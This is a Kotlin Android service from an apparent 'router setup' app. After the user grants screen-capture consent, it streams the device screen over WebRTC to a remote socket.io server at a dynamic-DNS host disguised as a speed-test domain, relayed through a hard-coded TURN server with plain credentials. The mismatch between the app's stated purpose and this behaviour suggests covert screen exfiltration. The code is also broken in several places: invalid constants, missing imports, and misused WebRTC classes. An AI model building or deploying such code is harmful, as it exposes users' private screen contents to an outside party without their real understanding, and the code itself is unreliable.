package com.example.routersetup

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONObject
import org.webrtc.*

class ScreenCaptureService : Service() {
    private lateinit var projectionManager: MediaProjectionManager
    private var mediaProjection: MediaProjection? = null
    private lateinit var socket: Socket
    private lateinit var peerConnectionFactory: PeerConnectionFactory
    private var peerConnection: PeerConnection? = null
    private var videoSource: VideoSource? = null
    private var videoTrack: VideoTrack? = null
    private var videoCapturer: VideoCapturer? = null
    private val coroutineScope = CoroutineScope(Dispatchers.IO + Job())

    private const val TAG = "ScreenCaptureService"
    private const val NOTIFICATION_ID = 1
    private const val CHANNEL_ID = "SCREEN_CAPTURE_CHANNEL"

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "onCreate called")
        projectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        setupSocket()
        initializePeerConnection()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "onStartCommand called")
        val resultCode = intent?.getIntExtra("code", Activity.RESULT_CANCELED) ?: return START_NOT_STICKY
        val data = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            intent.getParcelableExtra("data", Intent::class.java)
        } else {
            @Suppress("DEPRECATION")
            intent.getParcelableExtra("data")
        }
        if (resultCode == Activity.RESULT_OK && data != null) {
            mediaProjection = projectionManager.getMediaProjection(resultCode, data)
            Log.d(TAG, "MediaProjection obtained successfully")
            startForegroundServiceWithNotification()
            startScreenCapture()
        } else {
            Log.e(TAG, "MediaProjection not obtained")
            stopSelf()
        }
        return START_NOT_STICKY
    }

    private fun startForegroundServiceWithNotification() {
        createNotificationChannel()
        val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Screen Capture Service")
            .setContentText("Screen capturing is running...")
            .setSmallIcon(R.drawable.ic_launcher_foreground)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
        startForeground(NOTIFICATION_ID, notification)
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Screen Capture Service",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    private fun setupSocket() {
        try {
            socket = IO.socket("https://ping-speed.ddns.net", mapOf("path" to "/socket.io/", "transports" to listOf("websocket", "polling"), "reconnection" to true))
            socket.connect()
            socket.on(Socket.EVENT_CONNECT) {
                println("Connected to server!")
                socket.emit("readyForOffer")
            }
            socket.on(Socket.EVENT_DISCONNECT) {
                println("Disconnected from server!")
                peerConnection?.close()
            }
            socket.on("webrtcSignal") { args ->
                coroutineScope.launch {
                    if (args.isNotEmpty()) {
                        val data = args[0] as JSONObject
                        val signalObj = data.getJSONObject("signal")
                        val fromId = data.optString("from", "")
                        when (signalObj.getString("type")) {
                            "offer" -> handleOffer(signalObj)
                            "answer" -> handleAnswer(signalObj)
                            "candidate" -> handleCandidate(signalObj)
                        }
                    }
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private suspend fun handleOffer(signalObj: JSONObject) {
        val sdp = signalObj.getString("sdp")
        val sessionDescription = SessionDescription(SessionDescription.Type.OFFER, sdp)
        withContext(Dispatchers.Main) {
            peerConnection?.setRemoteDescription(object : SimpleSdpObserver() {
                override fun onSetSuccess() {
                    createAnswer()
                }
            }, sessionDescription)
        }
    }

    private suspend fun handleAnswer(signalObj: JSONObject) {
        val sdp = signalObj.getString("sdp")
        val sessionDescription = SessionDescription(SessionDescription.Type.ANSWER, sdp)
        withContext(Dispatchers.Main) {
            peerConnection?.setRemoteDescription(
                object : SimpleSdpObserver() {
                    override fun onSetSuccess() {
                        println("Remote description (answer) set successfully")
                    }
                    override fun onSetFailure(error: String?) {
                        println("Failed to set remote description: $error")
                    }
                },
                sessionDescription
            )
        }
    }

    private suspend fun handleCandidate(signalObj: JSONObject) {
        val candidateObj = signalObj.getJSONObject("candidate")
        val candidate = IceCandidate(
            candidateObj.getString("sdpMid"),
            candidateObj.getInt("sdpMLineIndex"),
            candidateObj.getString("candidate")
        )
        withContext(Dispatchers.Main) {
            peerConnection?.addIceCandidate(candidate)
        }
    }

    private fun initializePeerConnection() {
        val initOptions = PeerConnectionFactory.InitializationOptions
            .builder(this)
            .setEnableInternalTracer(true)
            .createInitializationOptions()
        PeerConnectionFactory.initialize(initOptions)
        peerConnectionFactory = PeerConnectionFactory.builder()
            .setOptions(PeerConnectionFactory.Options())
            .createPeerConnectionFactory()
        val iceServers = listOf(
            PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer(),
            PeerConnection.IceServer.builder("turn:176.126.70.215:3478")
                .setUsername("test")
                .setPassword("password123")
                .createIceServer()
        )
        val rtcConfig = PeerConnection.RTCConfiguration(iceServers)
        peerConnection = peerConnectionFactory.createPeerConnection(
            rtcConfig,
            object : PeerConnection.Observer {
                override fun onIceCandidate(candidate: IceCandidate?) {
                    candidate?.let {
                        val candidateJson = JSONObject().apply {
                            put("type", "candidate")
                            put("candidate", JSONObject().apply {
                                put("candidate", it.sdp)
                                put("sdpMid", it.sdpMid)
                                put("sdpMLineIndex", it.sdpMLineIndex)
                            })
                        }
                        val payload = JSONObject().apply {
                            put("signal", candidateJson)
                        }
                        socket.emit("webrtcSignal", payload)
                    }
                }
                override fun onSignalingChange(newState: PeerConnection.SignalingState?) {}
                override fun onIceConnectionChange(newState: PeerConnection.IceConnectionState?) {}
                override fun onIceConnectionReceivingChange(receiving: Boolean) {}
                override fun onIceGatheringChange(newState: PeerConnection.IceGatheringState?) {}
                override fun onIceCandidatesRemoved(candidates: Array<out IceCandidate>?) {}
                override fun onAddStream(stream: MediaStream?) {}
                override fun onRemoveStream(stream: MediaStream?) {}
                override fun onDataChannel(channel: DataChannel?) {}
                override fun onTrack(transceiver: RtpTransceiver?) {
                    transceiver?.receiver?.track?.let { track ->
                        if (track is VideoTrack) {
                            // Handle incoming video track
                        }
                    }
                }
                override fun onRenegotiationNeeded() {}
                override fun onAddTrack(
                    receiver: RtpReceiver?, mediaStreams: Array<out MediaStream>?
                ) {}
            }
        )
    }

    private fun createAnswer() {
        val constraints = MediaConstraints()
        peerConnection?.createAnswer(object : SimpleSdpObserver() {
            override fun onCreateSuccess(sdp: SessionDescription?) {
                peerConnection?.setLocalDescription(object : SimpleSdpObserver() {}, sdp)
                val answerJson = JSONObject().apply {
                    put("type", "answer")
                    put("sdp", sdp?.description)
                }
                val payload = JSONObject().apply {
                    put("signal", answerJson)
                }
                socket.emit("webrtcSignal", payload)
            }
            override fun onCreateFailure(error: String?) {
                println("Failed to create answer: $error")
            }
        }, constraints)
    }

    private fun startScreenCapture() {
        val surfaceTextureHelper = SurfaceTextureHelper.create("CaptureThread", EglBase.create().eglBaseContext)
        videoCapturer = object : VideoCapturer() {
            override fun initialize(sink: CapturerObserver?, applicationContext: Context?, context: Context?) {
                sink?.onCapturerStarted(true)
            }

            override fun startCapture(width: Int, height: Int, fps: Int) {
                // Start capturing the screen
                val virtualDisplay = mediaProjection?.createVirtualDisplay(
                    "ScreenCapture",
                    width, height, width * height / 1000,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_PUBLIC,
                    surfaceTextureHelper.surfaceTexture,
                    null,
                    null
                )
                videoSource = peerConnectionFactory.createVideoSource(false)
                videoTrack = peerConnectionFactory.createVideoTrack("ARDAMSv0", videoSource)
                videoTrack?.setEnabled(true)
                videoTrack?.addSink(surfaceTextureHelper)
                peerConnection?.addTrack(videoTrack!!, listOf(MediaStreamTrack.MediaType.VIDEO))
            }

            override fun stopCapture() {
                mediaProjection?.stop()
                videoSource?.dispose()
                videoTrack?.dispose()
            }

            override fun release() {
                mediaProjection?.stop()
                videoSource?.dispose()
                videoTrack?.dispose()
            }

            override fun changeCaptureFormat(width: Int, height: Int, fps: Int) {}
        }
        videoCapturer?.initialize(null, this, this)
        videoCapturer?.startCapture(1080, 1920, 30)
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d(TAG, "onDestroy called")
        stopForeground(STOP_FOREGROUND_REMOVE)
        mediaProjection?.stop()
        mediaProjection = null
        videoCapturer?.release()
        videoSource?.dispose()
        videoTrack?.dispose()
        peerConnection?.close()
        socket.disconnect()
        coroutineScope.cancel()
    }
}
